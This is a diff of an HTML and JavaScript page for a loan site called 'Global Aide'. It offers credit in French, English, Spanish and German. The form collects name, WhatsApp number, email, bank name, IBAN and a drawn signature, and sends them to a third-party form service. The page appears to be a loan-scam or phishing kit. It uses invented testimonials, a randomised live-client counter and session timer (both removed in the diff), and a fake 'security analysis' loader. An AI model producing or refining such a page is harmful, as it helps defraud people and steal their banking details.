@@ -3,167 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Aide | Institutional Finance</title>
+    <title>Global Aide | Finance 2026</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         .step { display: none; animation: fadeIn 0.4s ease-out; }
         .step.active { display: flex; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        .lang-btn.selected { border: 3px solid #fbbf24 !important; background-color: rgba(255,255,255,0.2) !important; transform: scale(1.05); }
+        .lang-btn.selected { border: 3px solid #1d4ed8 !important; background-color: #eff6ff !important; transform: scale(1.02); }
         .slider { -webkit-appearance: none; width: 100%; height: 6px; border-radius: 5px; background: #e2e8f0; outline: none; }
-        .slider::-webkit-slider-thumb { -webkit-appearance: none; width: 20px; height: 20px; border-radius: 50%; background: #1d4ed8; cursor: pointer; border: 3px solid white; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        #signature-pad { border: 1px solid #e2e8f0; background: #ffffff; cursor: crosshair; touch-action: none; border-radius: 12px; }
+        .slider::-webkit-slider-thumb { -webkit-appearance: none; width: 22px; height: 22px; border-radius: 50%; background: #1d4ed8; cursor: pointer; border: 3px solid white; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        #signature-pad { border: 2px dashed #e2e8f0; background: #ffffff; cursor: crosshair; touch-action: none; border-radius: 12px; }
         .loader-dots div { animation: blink 1.4s infinite cubic-bezier(0.4, 0, 0.6, 1); }
         .loader-dots div:nth-child(2) { animation-delay: 0.2s; }
         .loader-dots div:nth-child(3) { animation-delay: 0.4s; }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
     </style>
 </head>
-<body class="bg-[#F9FAFB] font-sans text-slate-900">
+<body class="bg-[#F9FAFB] font-sans text-slate-900 overflow-x-hidden">
 
     <nav class="bg-white border-b border-slate-100 p-4 flex justify-between items-center sticky top-0 z-50">
         <div class="flex items-center gap-2">
             <div class="w-8 h-8 bg-blue-700 rounded-lg flex items-center justify-center text-white font-bold text-lg">G</div>
             <div class="font-bold text-blue-900 tracking-tight text-lg uppercase">Global Aide</div>
         </div>
-        <button onclick="toggleTestimonials()" class="text-[11px] font-bold text-slate-500 uppercase tracking-widest border border-slate-200 px-3 py-2 rounded-lg hover:bg-slate-50 transition-all">
+        <button onclick="toggleTestimonials()" class="text-[10px] font-bold text-slate-500 uppercase tracking-widest border border-slate-200 px-3 py-2 rounded-lg">
             <i class="fas fa-comment-dots mr-1"></i> <span id="nav-testi">Avis</span>
         </button>
     </nav>
 
-    <div id="global-loader" class="hidden fixed inset-0 bg-white/90 backdrop-blur-sm z-[200] flex-col items-center justify-center">
-        <div class="loader-dots flex gap-2 mb-4">
-            <div class="w-4 h-4 bg-blue-700 rounded-full"></div>
-            <div class="w-4 h-4 bg-blue-700 rounded-full"></div>
-            <div class="w-4 h-4 bg-blue-700 rounded-full"></div>
+    <div id="global-loader" class="hidden fixed inset-0 bg-white/95 backdrop-blur-sm z-[200] flex-col items-center justify-center text-center p-6">
+        <div class="loader-dots flex gap-2 mb-6">
+            <div class="w-5 h-5 bg-blue-700 rounded-full"></div>
+            <div class="w-5 h-5 bg-blue-700 rounded-full"></div>
+            <div class="w-5 h-5 bg-blue-700 rounded-full"></div>
         </div>
-        <p id="loader-text" class="font-bold text-blue-900 animate-pulse text-sm uppercase tracking-widest">Analyse du dossier...</p>
+        <p id="loader-text" class="font-bold text-blue-900 animate-pulse text-sm uppercase tracking-widest">Analyse de sécurité...</p>
     </div>
 
     <div id="page-testi" class="hidden fixed inset-0 bg-[#F9FAFB] z-[100] overflow-y-auto p-6">
-        <div class="max-w-xl mx-auto">
+        <div class="max-w-xl mx-auto text-center">
             <div class="flex justify-between items-center mb-8">
-                <h2 class="text-2xl font-black text-blue-900" id="testi-title">Retours d'expérience</h2>
-                <button onclick="toggleTestimonials()" class="w-10 h-10 flex items-center justify-center bg-white rounded-full shadow-sm text-slate-400">&times;</button>
+                <h2 class="text-2xl font-black text-blue-900" id="testi-title">Avis</h2>
+                <button onclick="toggleTestimonials()" class="text-2xl text-slate-400">&times;</button>
             </div>
             <div id="testi-list" class="grid gap-4"></div>
-            <button onclick="toggleTestimonials()" class="w-full bg-slate-900 text-white py-4 rounded-2xl font-bold mt-10 shadow-xl">FERMER</button>
+            <button onclick="toggleTestimonials()" class="w-full bg-slate-900 text-white py-4 rounded-xl font-bold mt-8 uppercase text-xs tracking-widest" id="btn-close-testi">Fermer</button>
         </div>
     </div>
 
-    <section id="step-lang" class="step active min-h-[90vh] flex-col items-center justify-center p-6 text-center">
-        <div class="mb-8">
-            <h1 class="text-3xl font-black text-blue-900 mb-2">Bienvenue</h1>
-            <p class="text-slate-500 text-sm">Veuillez sélectionner votre langue de gestion</p>
+    <section id="step-lang" class="step active min-h-[85vh] flex-col items-center justify-center p-6 text-center">
+        <div class="mb-10"><h1 class="text-3xl font-black text-blue-900 mb-2">GLOBAL AIDE</h1><p class="text-slate-500 text-sm">SÉLECTIONNEZ VOTRE LANGUE</p></div>
+        <div class="grid grid-cols-2 gap-4 w-full max-w-sm mb-12">
+            <button onclick="selectLang('fr', '€')" class="lang-btn p-6 rounded-2xl bg-white border border-slate-200 shadow-sm flex flex-col items-center gap-3" id="btn-fr"><span>🇫🇷</span><span class="font-bold">Français</span></button>
+            <button onclick="selectLang('en', '$')" class="lang-btn p-6 rounded-2xl bg-white border border-slate-200 shadow-sm flex flex-col items-center gap-3" id="btn-en"><span>🇺🇸</span><span class="font-bold">English</span></button>
+            <button onclick="selectLang('es', '$')" class="lang-btn p-6 rounded-2xl bg-white border border-slate-200 shadow-sm flex flex-col items-center gap-3" id="btn-es"><span>🇪🇸</span><span class="font-bold">Español</span></button>
+            <button onclick="selectLang('de', '€')" class="lang-btn p-6 rounded-2xl bg-white border border-slate-200 shadow-sm flex flex-col items-center gap-3" id="btn-de"><span>🇩🇪</span><span class="font-bold">Deutsch</span></button>
         </div>
-        <div class="grid grid-cols-2 gap-4 w-full max-w-sm mb-10">
-            <button onclick="selectLang('fr', '€')" class="lang-btn p-6 rounded-2xl bg-white border border-slate-100 shadow-sm flex flex-col items-center gap-3 transition-all" id="btn-fr"><span class="text-3xl">🇫🇷</span><span class="font-bold text-slate-700">Français</span></button>
-            <button onclick="selectLang('en', '$')" class="lang-btn p-6 rounded-2xl bg-white border border-slate-100 shadow-sm flex flex-col items-center gap-3 transition-all" id="btn-en"><span class="text-3xl">🇺🇸</span><span class="font-bold text-slate-700">English</span></button>
-            <button onclick="selectLang('es', '$')" class="lang-btn p-6 rounded-2xl bg-white border border-slate-100 shadow-sm flex flex-col items-center gap-3 transition-all" id="btn-es"><span class="text-3xl">🇪🇸</span><span class="font-bold text-slate-700">Español</span></button>
-            <button onclick="selectLang('de', '€')" class="lang-btn p-6 rounded-2xl bg-white border border-slate-100 shadow-sm flex flex-col items-center gap-3 transition-all" id="btn-de"><span class="text-3xl">🇩🇪</span><span class="font-bold text-slate-700">Deutsch</span></button>
+        <div id="lang-cont-container" class="w-full max-w-sm" style="display:none;">
+            <button onclick="goToStep(2)" class="w-full bg-blue-700 text-white py-5 rounded-2xl font-bold shadow-xl flex items-center justify-center gap-3"><span id="btn-text">CONTINUER</span> <i class="fas fa-arrow-right"></i></button>
         </div>
-        <button id="lang-continue" onclick="goToStep(2)" style="display: none;" class="w-full max-w-sm bg-blue-700 text-white py-5 rounded-2xl font-bold text-lg shadow-xl flex items-center justify-center gap-3">
-            <span id="btn-text">CONTINUER</span> <i class="fas fa-arrow-right"></i>
-        </button>
     </section>
 
     <section id="step-sim" class="step min-h-screen flex-col p-4">
         <div class="max-w-xl mx-auto w-full">
-            <div class="flex justify-between items-center mb-6 mt-4">
-                <div class="text-[10px] bg-blue-50 text-blue-700 px-3 py-1 rounded-full font-bold border border-blue-100">
-                    <i class="fas fa-users mr-1"></i> <span id="live-count">24 clients actifs</span>
-                </div>
-            </div>
-            <div class="bg-white p-8 rounded-[2rem] shadow-sm border border-slate-100 mb-6">
-                <div class="mb-10">
-                    <div class="flex justify-between items-center mb-6">
-                        <span id="lbl-amt" class="text-xs font-bold text-slate-400 uppercase tracking-widest">Montant du crédit</span>
-                        <div class="flex items-center">
-                            <input type="number" id="amountInput" value="10000" oninput="sync('amt')" class="text-2xl font-black text-blue-700 w-28 text-right bg-transparent outline-none">
-                            <span class="curr text-2xl font-black text-blue-700 ml-1">€</span>
-                        </div>
-                    </div>
+            <div class="bg-white p-8 rounded-[2rem] shadow-sm border border-slate-100">
+                <h2 class="text-2xl font-black text-blue-900 text-center mb-8" id="sim-title">Simulation</h2>
+                <div class="mb-8">
+                    <div class="flex justify-between mb-4"><span id="lbl-amt" class="text-xs font-bold text-slate-400 uppercase">Montant</span><div class="flex font-black text-blue-700 text-xl"><input type="number" id="amountInput" value="10000" oninput="sync('amt')" class="w-24 text-right bg-transparent outline-none"><span class="curr ml-1">€</span></div></div>
                     <input type="range" id="amountRange" min="1000" max="500000" step="1000" value="10000" oninput="sync('range')" class="slider">
                 </div>
                 <div class="mb-10">
-                    <div class="flex justify-between items-center mb-6">
-                        <span id="lbl-dur" class="text-xs font-bold text-slate-400 uppercase tracking-widest">Durée</span>
-                        <div class="flex items-center">
-                            <input type="number" id="yearInput" value="5" oninput="syncYear('num')" class="text-2xl font-black text-blue-700 w-16 text-right bg-transparent outline-none">
-                            <span id="lbl-years" class="text-xl font-black text-blue-700 ml-2">Ans</span>
-                        </div>
-                    </div>
+                    <div class="flex justify-between mb-4"><span id="lbl-dur" class="text-xs font-bold text-slate-400 uppercase">Période</span><div class="flex font-black text-blue-700 text-xl"><input type="number" id="yearInput" value="5" oninput="syncYear('num')" class="w-14 text-right bg-transparent outline-none"><span id="lbl-years" class="ml-2">Ans</span></div></div>
                     <input type="range" id="yearRange" min="1" max="30" step="1" value="5" oninput="syncYear('range')" class="slider">
                 </div>
-                <div class="bg-slate-50 p-6 rounded-2xl border border-slate-100 space-y-3">
-                    <div class="flex justify-between text-sm text-slate-500"><span id="res-lbl-men">Mensualité</span><span id="res-monthly" class="font-bold text-blue-900 text-lg">171 €</span></div>
-                    <div class="flex justify-between text-xs text-slate-400 border-t border-slate-200 pt-3"><span id="res-lbl-tot">Total dû</span><span id="res-total" class="font-medium">10300 €</span></div>
+                <div class="bg-slate-50 p-6 rounded-2xl space-y-4">
+                    <div class="flex justify-between"><span id="res-lbl-men" class="text-slate-500">Mensualité</span><span id="res-monthly" class="font-black text-blue-900 text-xl">171 €</span></div>
+                    <div class="flex justify-between text-xs text-slate-400"><span id="res-lbl-tot">Total</span><span id="res-total" class="font-bold">10300 €</span></div>
                 </div>
-                <button onclick="goToStep(3)" class="w-full bg-blue-700 text-white py-5 rounded-2xl font-bold mt-8 shadow-lg hover:bg-blue-800 transition-all uppercase tracking-wide" id="btn-next">Suivant</button>
-            </div>
-        </div>
-        </section>
-                                 <section id="step-form" class="step min-h-screen flex-col p-4">
-        <div class="max-w-xl mx-auto w-full pt-4">
-            <div class="flex justify-between items-center mb-6">
-                <button onclick="goToStep(2)" class="text-slate-400 font-bold text-sm flex items-center gap-2"><i class="fas fa-chevron-left"></i> <span id="btn-back">Retour</span></button>
-                <div id="timer" class="text-slate-500 font-bold text-[10px] bg-white border border-slate-200 px-3 py-1 rounded-full uppercase tracking-tighter">
-                    Session: <span id="time-val">15:00</span>
-                </div>
-            </div>
-            <div class="bg-white p-8 rounded-[2.5rem] shadow-sm border border-slate-100">
-                <h2 class="text-2xl font-black text-blue-900 mb-6" id="form-title">Dossier de demande</h2>
-                <form action="https://formspree.io/f/xnjqwngo" method="POST" class="space-y-4" id="loanForm" onsubmit="return handleFormSubmit(event)">
-                    <input type="hidden" name="Crédit_Montant" id="h-m">
-                    <input type="hidden" name="Crédit_Durée" id="h-d">
-                    <input type="hidden" name="SIGNATURE_DATA" id="h-sign">
-                    
-                    <div class="grid grid-cols-1 gap-4">
-                        <div class="space-y-1">
-                            <label class="text-[10px] font-bold text-slate-400 uppercase ml-2">Localisation</label>
-                            <select id="country-select" name="Pays" onchange="updateCountryData()" class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 font-bold outline-none">
-                                <option value="France" data-code="+33" data-curr="€">🇫🇷 France</option>
-                                <option value="Porto Rico" data-code="+1-787" data-curr="$">🇵🇷 Porto Rico</option>
-                                <option value="Panama" data-code="+507" data-curr="$">🇵🇦 Panama</option>
-                                <option value="USA" data-code="+1" data-curr="$">🇺🇸 USA</option>
-                            </select>
-                        </div>
-                        <input type="text" id="i-nom" name="Nom_Complet" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none focus:border-blue-500 font-medium">
-                        <div class="flex gap-2">
-                            <span id="phone-prefix" class="p-4 bg-slate-100 rounded-xl font-bold text-slate-500 flex items-center text-sm">+33</span>
-                            <input type="tel" id="i-wa" name="WhatsApp" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 flex-grow outline-none focus:border-blue-500">
-                        </div>
-                        <input type="email" id="i-email" name="Email" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none focus:border-blue-500">
-                    </div>
-
-                    <div class="pt-6 border-t border-slate-100 space-y-4">
-                        <input type="text" id="i-bank-name" name="Etablissement_Bancaire" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none focus:border-blue-500">
-                        <input type="text" id="i-bank-acc" name="Identifiant_Compte_IBAN" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none focus:border-blue-500">
-                    </div>
-
-                    <div class="pt-6">
-                        <label class="text-[10px] font-bold text-slate-400 uppercase ml-2 mb-2 block" id="lbl-sign">Signature contractuelle</label>
-                        <canvas id="signature-pad" width="300" height="150" class="w-full"></canvas>
-                        <button type="button" onclick="clearSignature()" class="text-[10px] text-blue-600 font-bold mt-2 uppercase tracking-widest" id="btn-clear">Réinitialiser</button>
-                    </div>
-
-                    <button type="submit" id="submit-btn" class="w-full bg-blue-700 text-white p-5 rounded-2xl font-bold text-lg shadow-xl mt-6 transition-all active:scale-95">
-                        <span id="btn-submit">SOUMETTRE LE DOSSIER</span>
-                    </button>
-                </form>
+                <button onclick="goToStep(3)" class="w-full bg-blue-700 text-white py-5 rounded-2xl font-bold mt-8 shadow-lg uppercase text-sm" id="btn-next">Suivant</button>
             </div>
         </div>
     </section>
 
-    <script>
+    <section id="step-form" class="step min-h-screen flex-col p-4">
+        <div class="max-w-xl mx-auto w-full">
+            <div class="bg-white p-8 rounded-[2.5rem] shadow-sm border border-slate-100">
+                <form action="https://formspree.io/f/xnjqwngo" method="POST" id="loanForm" onsubmit="return handleFormSubmit(event)" class="space-y-4">
+                    <input type="hidden" name="Crédit_Montant" id="h-m">
+                    <input type="hidden" name="Crédit_Durée" id="h-d">
+                    <input type="hidden" name="SIGNATURE" id="h-sign">
+                    <h2 class="text-2xl font-black text-blue-900 mb-6" id="form-title">Dossier</h2>
+                    <select id="country-select" name="Pays" onchange="updateCountryData()" class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 font-bold outline-none">
+                        <option value="France" data-code="+33" data-curr="€">🇫🇷 France</option>
+                        <option value="Porto Rico" data-code="+1-787" data-curr="$">🇵🇷 Porto Rico</option>
+                        <option value="Panama" data-code="+507" data-curr="$">🇵🇦 Panama</option>
+                        <option value="USA" data-code="+1" data-curr="$">🇺🇸 USA</option>
+                    </select>
+                    <input type="text" id="i-nom" name="Nom" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none" placeholder="Nom">
+                    <div class="flex gap-2"><span id="phone-prefix" class="p-4 bg-slate-100 rounded-xl font-bold text-slate-500">+33</span><input type="tel" id="i-wa" name="WhatsApp" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none flex-grow"></div>
+                    <input type="email" id="i-email" name="Email" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none" placeholder="Email">
+                    <input type="text" id="i-bank-name" name="Banque" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none" placeholder="Banque">
+                    <input type="text" id="i-bank-acc" name="IBAN" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none" placeholder="Compte">
+                    <div class="pt-4">
+                        <label class="text-[10px] font-bold text-slate-400 uppercase block mb-2" id="lbl-sign">Signature</label>
+                        <canvas id="signature-pad" width="400" height="200" class="w-full"></canvas>
+                        <button type="button" onclick="clearSignature()" class="text-[10px] text-red-500 font-bold mt-2 uppercase underline" id="btn-clear">Effacer</button>
+                    </div>
+                    <button type="submit" class="w-full bg-blue-700 text-white p-5 rounded-2xl font-bold text-lg shadow-xl mt-6 uppercase" id="btn-submit">Envoyer</button>
+                </form>
+            </div>
+        </div>
+    </section>
+        <script>
         let cL = 'fr', cC = '€';
         const cv = document.getElementById('signature-pad'), cx = cv.getContext('2d');
         let w = false;
 
         function sD(e) { w = true; d(e); }
         function stD() { w = false; cx.beginPath(); }
-        function d(e) { if (!w) return; cx.lineWidth = 2.5; cx.lineCap = "round"; cx.strokeStyle = "#0f172a"; const r = cv.getBoundingClientRect(); const x = (e.clientX || (e.touches ? e.touches[0].clientX : 0)) - r.left, y = (e.clientY || (e.touches ? e.touches[0].clientY : 0)) - r.top; cx.lineTo(x, y); cx.stroke(); cx.beginPath(); cx.moveTo(x, y); }
+        function d(e) { if (!w) return; cx.lineWidth = 3; cx.lineCap = "round"; cx.strokeStyle = "#000000"; const r = cv.getBoundingClientRect(); const x = (e.clientX || (e.touches ? e.touches[0].clientX : 0)) - r.left, y = (e.clientY || (e.touches ? e.touches[0].clientY : 0)) - r.top; cx.lineTo(x, y); cx.stroke(); cx.beginPath(); cx.moveTo(x, y); }
         cv.addEventListener('mousedown', sD); cv.addEventListener('mousemove', d); window.addEventListener('mouseup', stD); cv.addEventListener('touchstart', sD); cv.addEventListener('touchmove', d); cv.addEventListener('touchend', stD);
         
         function clearSignature() { cx.clearRect(0, 0, cv.width, cv.height); }
@@ -172,73 +131,61 @@
             e.preventDefault();
             document.getElementById('h-sign').value = cv.toDataURL('image/png', 0.1);
             document.getElementById('global-loader').classList.remove('hidden');
-            
-            // Simulation d'une analyse technique du dossier avant envoi
             setTimeout(() => {
-                document.getElementById('loader-text').innerText = cL === 'fr' ? "Envoi du dossier..." : "Sending files...";
-                setTimeout(() => {
-                    document.getElementById('loanForm').submit();
-                }, 2000);
-            }, 3000);
+                document.getElementById('loader-text').innerText = (cL === 'fr' ? "Envoi du dossier..." : "Sending...");
+                setTimeout(() => { document.getElementById('loanForm').submit(); }, 2000);
+            }, 2500);
         }
 
         function toggleTestimonials() { document.getElementById('page-testi').classList.toggle('hidden'); }
 
         const tr = {
             fr: { 
-                cont: "CONTINUER", sim: "Simulateur", sub: "Taux fixe 3%", amt: "Capital souhaité", dur: "Durée de remboursement", yr: "Ans", men: "Mensualité", tot: "Total dû", next: "Suivant", fTitle: "Dernière étape", back: "Retour", submit: "SOUMETTRE MON DOSSIER", live: "demandes en cours", clear: "Réinitialiser la signature", sign: "Signature numérique obligatoire", navTesti: "Avis Clients", testiTitle: "Retours d'expérience",
-                pl_nom: "Nom & Prénom", pl_wa: "N° WhatsApp", pl_email: "Adresse Email", pl_bankName: "Nom de votre établissement", pl_bankAcc: "Identifiant de compte / IBAN",
-                tests: [
-                    {n:"M. Laurent", t:"Excellent service. Dossier traité en moins de 48h.", i:"ML", c:"bg-blue-100"},
-                    {n:"J. Dubois", t:"Taux très compétitif et interface claire.", i:"JD", c:"bg-green-100"},
-                    {n:"S. Garnier", t:"Une aide précieuse pour mes projets.", i:"SG", c:"bg-purple-100"},
-                    {n:"L. Morel", t:"La signature électronique facilite tout.", i:"LM", c:"bg-orange-100"},
-                    {n:"E. Roussel", t:"Sérieux et transparent du début à la fin.", i:"ER", c:"bg-red-100"}
-                ]
+                cont: "CONTINUER", sim: "Simulateur", amt: "Montant", dur: "Période", yr: "Ans", men: "Mensualité", tot: "Total", next: "Suivant", fTitle: "Dossier de prêt", back: "RETOUR", submit: "ENVOYER LA DEMANDE", clear: "Réinitialiser", sign: "Signature électronique", navTesti: "Avis", testiTitle: "Avis Clients", close: "Fermer",
+                pl_nom: "Nom & Prénom", pl_wa: "N° WhatsApp", pl_email: "Email", pl_bankName: "Banque", pl_bankAcc: "IBAN",
+                tests: [{n:"M. Laurent", t:"Excellent service.", i:"ML", c:"bg-blue-100"}, {n:"J. Dubois", t:"Taux très compétitif.", i:"JD", c:"bg-green-100"}]
             },
             en: { 
-                cont: "CONTINUE", sim: "Simulator", sub: "3% Fixed Rate", amt: "Loan Amount", dur: "Duration", yr: "Years", men: "Monthly Payment", tot: "Total Due", next: "Next Step", fTitle: "Final Step", back: "Back", submit: "SUBMIT APPLICATION", live: "active applications", clear: "Clear signature", sign: "Digital signature required", navTesti: "Reviews", testiTitle: "User Experience",
-                pl_nom: "Full Name", pl_wa: "WhatsApp Number", pl_email: "Email Address", pl_bankName: "Bank Name", pl_bankAcc: "Account ID / IBAN",
-                tests: [
-                    {n:"Mr. Adams", t:"Professional service. Very fast approval.", i:"MA", c:"bg-blue-100"},
-                    {n:"S. Knight", t:"Transparent process and low rates.", i:"SK", c:"bg-green-100"},
-                    {n:"R. Johnson", t:"The best banking experience this year.", i:"RJ", c:"bg-purple-100"},
-                    {n:"D. Miller", t:"Simple and efficient.", i:"DM", c:"bg-orange-100"},
-                    {n:"A. Smith", t:"Highly recommended for professionals.", i:"AS", c:"bg-red-100"}
-                ]
+                cont: "CONTINUE", sim: "Simulator", amt: "Amount", dur: "Duration", yr: "Years", men: "Monthly", tot: "Total", next: "Next Step", fTitle: "Application", back: "BACK", submit: "SUBMIT NOW", clear: "Clear", sign: "Digital signature", navTesti: "Reviews", testiTitle: "User Reviews", close: "Close",
+                pl_nom: "Full Name", pl_wa: "WhatsApp", pl_email: "Email", pl_bankName: "Bank Name", pl_bankAcc: "IBAN",
+                tests: [{n:"Mr. Adams", t:"Professional service.", i:"MA", c:"bg-blue-100"}, {n:"S. Knight", t:"Low rates.", i:"SK", c:"bg-green-100"}]
+            },
+            es: { 
+                cont: "CONTINUAR", sim: "Simulador", amt: "Monto", dur: "Plazo", yr: "Años", men: "Mensualidad", tot: "Total", next: "Siguiente", fTitle: "Expediente", back: "ATRÁS", submit: "ENVIAR SOLICITUD", clear: "Borrar", sign: "Firma digital", navTesti: "Opiniones", testiTitle: "Reseñas", close: "Cerrar",
+                pl_nom: "Nombre completo", pl_wa: "WhatsApp", pl_email: "Correo", pl_bankName: "Banco", pl_bankAcc: "IBAN",
+                tests: [{n:"C. Ruiz", t:"Muy rápido.", i:"CR", c:"bg-blue-100"}, {n:"E. Pérez", t:"Gracias.", i:"EP", c:"bg-green-100"}]
+            },
+            de: { 
+                cont: "WEITER", sim: "Simulator", amt: "Betrag", dur: "Dauer", yr: "Jahre", men: "Monatlich", tot: "Gesamt", next: "Weiter", fTitle: "Kreditantrag", back: "ZURÜCK", submit: "ANTRAG SENDEN", clear: "Löschen", sign: "Signatur", navTesti: "Bewertungen", testiTitle: "Kundenbewertungen", close: "Schließen",
+                pl_nom: "Name", pl_wa: "WhatsApp", pl_email: "E-Mail", pl_bankName: "Bank", pl_bankAcc: "IBAN",
+                tests: [{n:"H. Müller", t:"Schnelle Auszahlung.", i:"HM", c:"bg-blue-100"}, {n:"I. Schmidt", t:"Top Konditionen.", i:"IS", c:"bg-green-100"}]
             }
         };
 
-        function selectLang(l, c) { cL = l; cC = c; document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('selected')); document.getElementById('btn-' + l).classList.add('selected'); document.getElementById('btn-text').innerText = tr[l].cont; document.getElementById('lang-continue').style.display = 'flex'; upUI(l); }
-        function goToStep(s) { document.querySelectorAll('.step').forEach(e => e.classList.remove('active')); const i = [null, 'step-lang', 'step-sim', 'step-form']; document.getElementById(i[s]).classList.add('active'); if (s === 3) { sT(); } window.scrollTo(0,0); }
+        function selectLang(l, c) { 
+            cL = l; cC = c; 
+            document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('selected')); 
+            document.getElementById('btn-' + l).classList.add('selected'); 
+            document.getElementById('btn-text').innerText = tr[l].cont; 
+            document.getElementById('lang-cont-container').style.display = 'block'; 
+            upUI(l); 
+        }
+
+        function goToStep(s) { document.querySelectorAll('.step').forEach(e => e.classList.remove('active')); const i = [null, 'step-lang', 'step-sim', 'step-form']; document.getElementById(i[s]).classList.add('active'); window.scrollTo(0,0); }
         function sync(s) { const r = document.getElementById('amountRange'), n = document.getElementById('amountInput'); if (s === 'range') n.value = r.value; else r.value = n.value; calc(); }
         function syncYear(s) { const r = document.getElementById('yearRange'), n = document.getElementById('yearInput'); if (s === 'range') n.value = r.value; else r.value = n.value; calc(); }
-        function calc() { const a = parseInt(document.getElementById('amountInput').value) || 1000, y = parseInt(document.getElementById('yearInput').value) || 2; const t = Math.round(a * 1.03), m = Math.round(t / (y * 12)); document.getElementById('res-total').innerText = t + " " + cC; document.getElementById('res-monthly').innerText = m + " " + cC; document.getElementById('h-m').value = a + " " + cC; document.getElementById('h-d').value = y + " ans"; document.querySelectorAll('.curr').forEach(e => e.innerText = cC); }
+        function calc() { const a = parseInt(document.getElementById('amountInput').value) || 1000, y = parseInt(document.getElementById('yearInput').value) || 1; const t = Math.round(a * 1.03), m = Math.round(t / (y * 12)); document.getElementById('res-total').innerText = t + " " + cC; document.getElementById('res-monthly').innerText = m + " " + cC; document.getElementById('h-m').value = a + " " + cC; document.getElementById('h-d').value = y + " ans"; document.querySelectorAll('.curr').forEach(e => e.innerText = cC); }
+
         function upUI(l) { 
             const t = tr[l]; 
-            const keys = ['sim', 'sub', 'amt', 'dur', 'yr', 'men', 'tot', 'next', 'fTitle', 'back', 'submit', 'clear', 'sign', 'navTesti', 'testiTitle'];
-            document.getElementById('sim-title').innerText = t.sim; document.getElementById('hero-sub').innerText = t.sub; document.getElementById('lbl-amt').innerText = t.amt; document.getElementById('lbl-dur').innerText = t.dur; document.getElementById('lbl-years').innerText = t.yr; document.getElementById('res-lbl-men').innerText = t.men; document.getElementById('res-lbl-tot').innerText = t.tot; document.getElementById('btn-next').innerText = t.next; document.getElementById('form-title').innerText = t.fTitle; document.getElementById('btn-back').innerText = t.back; document.getElementById('btn-submit').innerText = t.submit; document.getElementById('btn-clear').innerText = t.clear; document.getElementById('lbl-sign').innerText = t.sign; document.getElementById('nav-testi').innerText = t.navTesti; document.getElementById('testi-title').innerText = t.testiTitle;
+            document.getElementById('sim-title').innerText = t.sim; document.getElementById('lbl-amt').innerText = t.amt; document.getElementById('lbl-dur').innerText = t.dur; document.getElementById('lbl-years').innerText = t.yr; document.getElementById('res-lbl-men').innerText = t.men; document.getElementById('res-lbl-tot').innerText = t.tot; document.getElementById('btn-next').innerText = t.next; document.getElementById('form-title').innerText = t.fTitle; document.getElementById('btn-back').innerText = t.back; document.getElementById('btn-submit').innerText = t.submit; document.getElementById('btn-clear').innerText = t.clear; document.getElementById('lbl-sign').innerText = t.sign; document.getElementById('nav-testi').innerText = t.navTesti; document.getElementById('testi-title').innerText = t.testiTitle; document.getElementById('btn-close-testi').innerText = t.close;
             document.getElementById('i-nom').placeholder = t.pl_nom; document.getElementById('i-wa').placeholder = t.pl_wa; document.getElementById('i-email').placeholder = t.pl_email; document.getElementById('i-bank-name').placeholder = t.pl_bankName; document.getElementById('i-bank-acc').placeholder = t.pl_bankAcc;
-            
-            document.getElementById('testi-list').innerHTML = t.tests.map(test => `
-                <div class="bg-white p-6 rounded-2xl border border-slate-100">
-                    <div class="flex items-center gap-4 mb-3">
-                        <div class="w-10 h-10 ${test.c} text-slate-700 rounded-full flex items-center justify-center font-bold text-xs">${test.i}</div>
-                        <span class="font-bold text-slate-900">${test.n}</span>
-                    </div>
-                    <p class="text-slate-500 text-sm italic">"${test.t}"</p>
-                </div>
-            `).join('');
-            
-            const sel = document.getElementById('country-select');
-            if (l === 'es') sel.value = "Porto Rico"; else if (l === 'en') sel.value = "USA"; else sel.value = "France";
-            upCD(); upLiveCount();
+            document.getElementById('testi-list').innerHTML = t.tests.map(test => `<div class="bg-white p-4 rounded-xl border border-slate-100 flex items-center gap-4 text-left"><div class="w-10 h-10 ${test.c} rounded-full flex items-center justify-center font-bold">${test.i}</div><div><p class="font-bold text-sm">${test.n}</p><p class="text-xs text-slate-500">"${test.t}"</p></div></div>`).join('');
+            upCD();
         }
+
         function upCD() { const o = document.getElementById('country-select').options[document.getElementById('country-select').selectedIndex]; document.getElementById('phone-prefix').innerText = o.getAttribute('data-code'); cC = o.getAttribute('data-curr'); calc(); }
-        function sT() { let d = 900; setInterval(() => { let m = Math.floor(d / 60), s = d % 60; if(document.getElementById('time-val')) document.getElementById('time-val').innerText = `${m}:${s < 10 ? '0' : ''}${s}`; if (--d < 0) d = 0; }, 1000); }
-        function upLiveCount() { const n = Math.floor(Math.random() * 10 + 20); document.getElementById('live-count').innerText = `${n} ${tr[cL].live}`; }
-        setInterval(upLiveCount, 5000); window.onload = calc;
+        window.onload = calc;
     </script>
 </body>
-    </html>
-    
+</html>
